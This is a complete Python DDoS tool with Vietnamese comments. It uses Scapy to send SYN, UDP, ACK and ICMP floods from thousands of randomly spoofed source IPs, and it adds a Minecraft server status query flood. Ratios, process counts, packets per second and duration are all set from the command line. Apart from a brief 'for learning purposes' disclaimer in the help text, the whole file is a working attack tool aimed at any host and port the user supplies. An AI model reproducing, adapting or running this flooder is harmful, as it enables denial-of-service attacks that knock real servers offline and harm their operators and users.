#!/usr/bin/env python3
import sys
import os
import platform
import psutil
import multiprocessing
import random
import time
import argparse
import logging
import json
import socket
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from functools import partial
from typing import List, Optional, Set

try:
    from scapy.all import IP, IPv6, TCP, UDP, ICMP, send
except ImportError:
    print("Cần cài Scapy: 'pip install scapy'")
    sys.exit(1)

try:
    from mcstatus import JavaServer
except ImportError:
    JavaServer = None

# Kiểm tra hệ điều hành
if platform.system() not in ["Linux", "Windows"]:
    print("Chỉ hỗ trợ Windows và Linux!")
    sys.exit(1)

# Thiết lập logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("ddos_attack.log")
    ]
)

class PacketGenerator:
    """Tạo các gói tin mạng với nguồn IP giả mạo."""
    
    def __init__(self, target_ip: str, target_port: int, fake_ips: Set[str], ipv6: bool = False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.fake_ips = list(fake_ips)
        self.ipv6 = ipv6

    def generate(self, attack_type: str) -> Optional[bytes]:
        """Tạo gói tin dựa trên loại tấn công."""
        src_ip = random.choice(self.fake_ips)
        src_port = random.randint(1024, 65535)
        try:
            pkt_class = IPv6 if self.ipv6 else IP
            if attack_type == "syn":
                return pkt_class(src=src_ip, dst=self.target_ip) / TCP(sport=src_port, dport=self.target_port, flags="S")
            elif attack_type == "udp":
                return pkt_class(src=src_ip, dst=self.target_ip) / UDP(sport=src_port, dport=self.target_port)
            elif attack_type == "ack":
                return pkt_class(src=src_ip, dst=self.target_ip) / TCP(sport=src_port, dport=self.target_port, flags="A")
            elif attack_type == "icmp":
                return pkt_class(src=src_ip, dst=self.target_ip) / ICMP()
        except Exception as e:
            logging.error(f"Lỗi tạo gói {attack_type}: {e}")
            return None

class AttackManager:
    """Quản lý quá trình tấn công DDoS."""
    
    def __init__(
        self,
        target_ip: str,
        target_port: int,
        processes: int,
        duration: int,
        attack_ratio: str,
        batch_size: int,
        delay: float,
        retry_count: int,
        max_cpu: int,
        is_root: bool,
        pps: Optional[int] = None,
        max_packets: Optional[int] = None,
        cpu_ratio: float = 0.75,
        ipv6: bool = False
    ):
        # Xác thực đầu vào
        if not self._is_valid_ip(target_ip, ipv6):
            raise ValueError("IP không hợp lệ!")
        if not (1 <= target_port <= 65535):
            raise ValueError("Cổng phải từ 1-65535!")
        
        self.target_ip = target_ip
        self.target_port = target_port
        self.processes = min(processes, int(psutil.cpu_count(logical=True) * cpu_ratio))
        self.duration = duration
        self.batch_size = max(50, min(batch_size, 1000))
        self.delay = max(0.0, min(delay, 1.0))
        self.retry_count = max(1, min(retry_count, 10))
        self.max_cpu = max(50, min(max_cpu, 98))
        self.is_root = is_root
        self.pps = pps
        self.max_packets = max_packets
        self.ipv6 = ipv6

        # Khởi tạo bộ đếm
        self.packet_count = multiprocessing.Value('i', 0)
        self.query_count = multiprocessing.Value('i', 0)

        # Tạo danh sách IP giả
        self.fake_ips = self._generate_fake_ips(ipv6)
        self.packet_generator = PacketGenerator(target_ip, target_port, self.fake_ips, ipv6)

        # Xử lý tỷ lệ tấn công
        ratios = [float(x) for x in attack_ratio.split(":")]
        if len(ratios) != 5 or abs(sum(ratios) - 100) > 0.01:
            raise ValueError("Tỷ lệ tấn công phải có dạng SYN:UDP:ACK:QUERY:ICMP, tổng=100")
        self.syn_ratio, self.udp_ratio, self.ack_ratio, self.query_ratio, self.icmp_ratio = [r / 100 for r in ratios]

        # Nếu không có quyền root, chỉ dùng query flood
        if not self.is_root and (self.syn_ratio + self.udp_ratio + self.ack_ratio + self.icmp_ratio > 0):
            logging.warning("Không có quyền root, chỉ chạy Query Flood.")
            self.syn_ratio = self.udp_ratio = self.ack_ratio = self.icmp_ratio = 0.0
            self.query_ratio = 1.0

    @staticmethod
    def _is_valid_ip(ip: str, ipv6: bool) -> bool:
        """Kiểm tra tính hợp lệ của địa chỉ IP."""
        family = socket.AF_INET6 if ipv6 else socket.AF_INET
        try:
            socket.inet_pton(family, ip)
            return True
        except socket.error:
            return False

    @staticmethod
    def _generate_fake_ips(ipv6: bool, count: int = 10000) -> Set[str]:
        """Tạo danh sách IP giả mạo."""
        if ipv6:
            return {f"2001:0db8::{random.randint(0, 0xffff):x}:{random.randint(0, 0xffff):x}" for _ in range(count)}
        return {f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(count)}

    def query_flood(self) -> None:
        """Thực hiện query flood (Minecraft server status)."""
        if not JavaServer:
            logging.error("mcstatus không được cài đặt, bỏ qua query flood.")
            return
        server = JavaServer.lookup(f"{self.target_ip}:{self.target_port}")
        for _ in range(self.retry_count):
            try:
                server.status()
                with self.query_count.get_lock():
                    self.query_count.value += 1
                break
            except Exception as e:
                logging.error(f"Lỗi query flood: {e}")
                time.sleep(0.1)

    def attack_worker(self, stop_event: multiprocessing.Event) -> None:
        """Worker xử lý việc gửi gói tin hoặc query."""
        while not stop_event.is_set():
            # Kiểm tra tài nguyên hệ thống
            if psutil.cpu_percent() > self.max_cpu or psutil.virtual_memory().percent > 90:
                time.sleep(0.1)
                continue
            if self.max_packets and self.packet_count.value >= self.max_packets:
                stop_event.set()
                break

            # Chỉ chạy query flood nếu query_ratio = 1
            if self.query_ratio == 1.0:
                with ThreadPoolExecutor(max_workers=5) as executor:
                    executor.submit(self.query_flood)
            else:
                packets = []
                for _ in range(self.batch_size):
                    r = random.random()
                    if r < self.syn_ratio:
                        pkt = self.packet_generator.generate("syn")
                    elif r < self.syn_ratio + self.udp_ratio:
                        pkt = self.packet_generator.generate("udp")
                    elif r < self.syn_ratio + self.udp_ratio + self.ack_ratio:
                        pkt = self.packet_generator.generate("ack")
                    elif r < self.syn_ratio + self.udp_ratio + self.ack_ratio + self.icmp_ratio:
                        pkt = self.packet_generator.generate("icmp")
                    else:
                        self.query_flood()
                        continue
                    if pkt:
                        packets.append(pkt)

                if packets:
                    for attempt in range(self.retry_count):
                        try:
                            send(packets, verbose=0, inter=0, pps=self.pps)
                            with self.packet_count.get_lock():
                                self.packet_count.value += len(packets)
                            break
                        except Exception as e:
                            logging.error(f"Lỗi gửi gói (thử {attempt + 1}/{self.retry_count}): {e}")
                            time.sleep(0.1)

            # Điều chỉnh độ trễ dựa trên pps
            if self.pps:
                self.delay = max(self.delay, self.batch_size / self.pps)
            if self.delay > 0:
                time.sleep(self.delay)

    def log_stats(self, stop_event: multiprocessing.Event) -> None:
        """Log thống kê định kỳ."""
        start_time = time.time()
        while not stop_event.is_set() and (time.time() - start_time) < self.duration:
            logging.info(json.dumps({
                "timestamp": datetime.utcnow().isoformat(),
                "packets_sent": self.packet_count.value,
                "queries_sent": self.query_count.value,
                "cpu_percent": psutil.cpu_percent(),
                "memory_percent": psutil.virtual_memory().percent
            }))
            time.sleep(5)

    def run(self) -> None:
        """Chạy quá trình tấn công."""
        stop_event = multiprocessing.Event()
        processes = []

        # Xử lý tín hiệu dừng
        def signal_handler(sig, frame):
            logging.info("Nhận tín hiệu dừng, đang thoát...")
            stop_event.set()
            for p in processes:
                p.terminate()
                p.join()
            sys.exit(0)

        signal.signal(signal.SIGINT, signal_handler)

        # Khởi động các worker
        logging.info(f"Bắt đầu tấn công {self.target_ip}:{self.target_port} trong {self.duration} giây...")
        for _ in range(self.processes):
            p = multiprocessing.Process(target=self.attack_worker, args=(stop_event,))
            processes.append(p)
            p.start()

        # Khởi động logging
        log_process = multiprocessing.Process(target=self.log_stats, args=(stop_event,))
        log_process.start()

        # Chờ thời gian tấn công
        time.sleep(self.duration)
        stop_event.set()

        # Đảm bảo tất cả process dừng
        for p in processes:
            p.terminate()
            p.join()
        log_process.terminate()
        log_process.join()

        logging.info(f"Kết thúc tấn công. Tổng gói: {self.packet_count.value}, tổng query: {self.query_count.value}")

def check_requirements() -> bool:
    """Kiểm tra quyền root/admin."""
    if platform.system() == "Linux":
        return os.geteuid() == 0
    elif platform.system() == "Windows":
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return False

def main():
    parser = argparse.ArgumentParser(
        description="Công cụ DDoS tối ưu cho mục đích học tập. SỬ DỤNG CÓ TRÁCH NHIỆM!",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("--host", required=True, help="IP đích")
    parser.add_argument("--port", type=int, required=True, help="Cổng đích")
    parser.add_argument("--processes", type=int, default=2, help="Số processes")
    parser.add_argument("--duration", type=int, default=30, help="Thời gian tấn công (giây)")
    parser.add_argument("--attack-ratio", default="0:0:0:100:0", help="Tỷ lệ SYN:UDP:ACK:QUERY:ICMP (tổng=100)")
    parser.add_argument("--batch-size", type=int, default=100, help="Số gói mỗi batch")
    parser.add_argument("--delay", type=float, default=0.01, help="Độ trễ giữa batch (giây)")
    parser.add_argument("--retry-count", type=int, default=3, help="Số lần thử lại khi lỗi")
    parser.add_argument("--max-cpu", type=int, default=85, help="Ngưỡng CPU tối đa (%)")
    parser.add_argument("--pps", type=int, help="Gói mỗi giây (packets per second)")
    parser.add_argument("--max-packets", type=int, help="Số gói tối đa")
    parser.add_argument("--cpu-ratio", type=float, default=0.75, help="Tỷ lệ CPU sử dụng (0.1-1.0)")
    parser.add_argument("--ipv6", action="store_true", help="Sử dụng IPv6")

    args = parser.parse_args()

    # Kiểm tra quyền root
    is_root = check_requirements()
    if not is_root:
        logging.warning("Không có quyền root/admin, một số chức năng sẽ bị hạn chế.")

    try:
        attack = AttackManager(
            target_ip=args.host,
            target_port=args.port,
            processes=args.processes,
            duration=args.duration,
            attack_ratio=args.attack_ratio,
            batch_size=args.batch_size,
            delay=args.delay,
            retry_count=args.retry_count,
            max_cpu=args.max_cpu,
            is_root=is_root,
            pps=args.pps,
            max_packets=args.max_packets,
            cpu_ratio=args.cpu_ratio,
            ipv6=args.ipv6
        )
        attack.run()
    except Exception as e:
        logging.error(f"Lỗi khi chạy tấn công: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()